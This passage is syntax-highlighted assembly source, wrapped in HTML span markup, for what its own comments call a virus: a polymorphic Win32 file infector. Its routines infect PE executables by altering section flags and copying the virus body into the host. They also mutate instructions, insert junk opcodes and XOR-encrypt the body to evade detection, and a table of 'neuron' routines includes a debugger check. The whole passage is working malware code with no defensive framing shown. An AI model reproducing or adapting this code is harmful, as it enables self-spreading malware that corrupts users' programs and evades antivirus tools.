    </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.SH_Characteristics.hiw.hib</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0e0h</span><span class="sc0">  </span><span class="sc1">;change flags</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.MZ_res2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.SH_PointerToRawData</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.SH_VirtualSize</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Start</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">virtual_end</span><span class="sc0"> 
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">buffer</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">virus_end</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">Start</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">GenerationCount</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Mutate</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsd</span><span class="sc0">                       </span><span class="sc1">;copy virus</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">EntryPoint</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;restore variable after copy stage</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                     </span><span class="sc1">;get start of MM-file</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                    </span><span class="sc1">;calculate new size</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">@30</span><span class="sc0">

</span><span class="sc5">end_InfectClose</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">WFD.WFD_nFileSizeLow</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">@30</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">nclose_param1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">nclose_param2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">          </span><span class="sc1">;close file</span><span class="sc0">
</span><span class="sc5">n24</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">nCloseFile_run</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
</span><span class="sc5">@40</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">@40</span><span class="sc0">
</span><span class="sc5">end_InfectFile</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">WFD.WFD_dwFileAttributes</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">WFD.WFD_szFileName</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ddSetFileAttributesA</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;set back file attributes</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">nInfect_run</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">n_infectfile</span><span class="sc0">
</span><span class="sc5">Neuron_InfectFile</span><span class="sc0">   </span><span class="sc9">EndP</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">Mutate</span><span class="sc0">  </span><span class="sc9">Proc</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">                      </span><span class="sc1">;store all regs</span><span class="sc0">


</span><span class="sc1">;first stage will rebuild some instructions with others, that does same thing</span><span class="sc0">
</span><span class="sc1">; - this is part of polymorphism</span><span class="sc0">
</span><span class="sc1">;1) nulify eax register</span><span class="sc0">

</span><span class="sc5">_mut_</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">nPoints</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;start of address table</span><span class="sc0">
</span><span class="sc5">mutate</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">lodsd</span><span class="sc0">                       </span><span class="sc1">;load first address</span><span class="sc0">
</span><span class="sc5">t7</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">next_mutate</span><span class="sc0">                  </span><span class="sc1">;end ?</span><span class="sc0">
</span><span class="sc5">mut_jmp</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">end_mutate</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                    </span><span class="sc1">;correct by delta offset</span><span class="sc0">
    </span><span class="sc6">in</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">                  </span><span class="sc1">;get pseudo-random number</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">                   </span><span class="sc1">;truncate</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">mut1</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">mutate</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc9">org</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
</span><span class="sc5">c1</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">op_st1</span><span class="sc0">                  </span><span class="sc1">;rewrite with xor eax, eax opcode</span><span class="sc0">
</span><span class="sc5">mut1</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc9">org</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
</span><span class="sc5">c2</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">op_st1</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">stosw</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">mutate</span><span class="sc0">

</span><span class="sc5">next_mutate</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;2) test for eax</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">mutate</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">tPoints</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">mut_jmp</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">9090h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">c1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc9">org</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">c2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc9">org</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">mutate</span><span class="sc0">


</span><span class="sc1">;this will crypt our body and insert some junk instructions randomly</span><span class="sc0">
</span><span class="sc5">end_mutate</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lodsd</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">_crypt_</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">junx</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">in</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">num_of_junx</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">lodsb</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">end_mutate</span><span class="sc0">

</span><span class="sc5">_crypt_</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc1">;generate pseudo-random key</span><span class="sc0">
    </span><span class="sc6">in</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">
    </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">
    </span><span class="sc6">in</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">key</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">

    </span><span class="sc1">;copy decryptor</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">Start</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">buffer</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">encrypted</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">Start</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">

    </span><span class="sc1">;crypt body</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">virus_end</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">encrypted</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">crypt</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">lodsd</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">crypt</span><span class="sc0">

    </span><span class="sc6">popad</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">Mutate</span><span class="sc0">  </span><span class="sc9">EndP</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">EntryPoint</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ExitProcess</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">400000h</span><span class="sc0">

</span><span class="sc1">;xor eax, eax</span><span class="sc0">
</span><span class="sc5">nPoints</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc9">irp</span><span class="sc0"> </span><span class="sc5">Num</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc4">,</span><span class="sc2">9</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">11</span><span class="sc4">,</span><span class="sc2">12</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">14</span><span class="sc4">,</span><span class="sc2">15</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc4">,</span><span class="sc2">17</span><span class="sc4">,</span><span class="sc2">18</span><span class="sc4">,</span><span class="sc2">19</span><span class="sc4">,</span><span class="sc2">20</span><span class="sc4">,</span><span class="sc2">21</span><span class="sc4">,</span><span class="sc2">22</span><span class="sc4">,</span><span class="sc2">23</span><span class="sc4">,</span><span class="sc2">24</span><span class="sc4">&gt;</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">n</span><span class="sc4">&amp;</span><span class="sc5">Num</span><span class="sc0">
            </span><span class="sc9">endm</span><span class="sc0">
</span><span class="sc5">nCount</span><span class="sc0">          </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">nPoints</span><span class="sc4">)/</span><span class="sc2">4</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">;test eax, eax</span><span class="sc0">
</span><span class="sc5">tPoints</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc9">irp</span><span class="sc0"> </span><span class="sc5">Num</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc4">&gt;</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">t</span><span class="sc4">&amp;</span><span class="sc5">Num</span><span class="sc0">
            </span><span class="sc9">endm</span><span class="sc0">
</span><span class="sc5">tCount</span><span class="sc0">          </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tPoints</span><span class="sc4">)/</span><span class="sc2">4</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">;junk address table</span><span class="sc0">
</span><span class="sc5">jPoints</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc9">irp</span><span class="sc0"> </span><span class="sc5">Num</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc4">,</span><span class="sc2">9</span><span class="sc4">&gt;</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">j</span><span class="sc4">&amp;</span><span class="sc5">Num</span><span class="sc0">
            </span><span class="sc9">endm</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">junx</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc6">clc</span><span class="sc0">             </span><span class="sc1">;junk instructions</span><span class="sc0">
            </span><span class="sc6">cmc</span><span class="sc0">
            </span><span class="sc6">stc</span><span class="sc0">
            </span><span class="sc6">nop</span><span class="sc0">
            </span><span class="sc6">cld</span><span class="sc0">
            </span><span class="sc6">std</span><span class="sc0">
            </span><span class="sc6">lahf</span><span class="sc0">
            </span><span class="sc6">cwde</span><span class="sc0">
            </span><span class="sc6">cdq</span><span class="sc0">
            </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
            </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc5">num_of_junx</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">junx</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">

</span><span class="sc5">NumOfExecs</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">GenerationCount</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">StartOfNeurons</span><span class="sc4">:</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Neuron_Debugger</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Neuron_Find</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Neuron_CheckFile</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Neuron_OpenFile</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Neuron_CloseFile</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Neuron_InfectFile</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Neuron_GetVersion</span><span class="sc0">
    </span><span class="sc5">num_of_neurons</span><span class="sc0">  </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">7</span><span class="sc0">

</span><span class="sc5">szGetModuleHandleA</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'GetModuleHandleA'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">szGetModuleHandleW</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'GetModuleHandleW'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">szAPIs</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">szCreateThread</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'CreateThread'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">szExitThread</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'ExitThread'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">szGetVersion</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'GetVersion'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">szFindFirstFileA</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'FindFirstFileA'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">szFindNextFileA</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'FindNextFileA'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">szFindClose</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'FindClose'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">szCreateFileA</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'CreateFileA'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
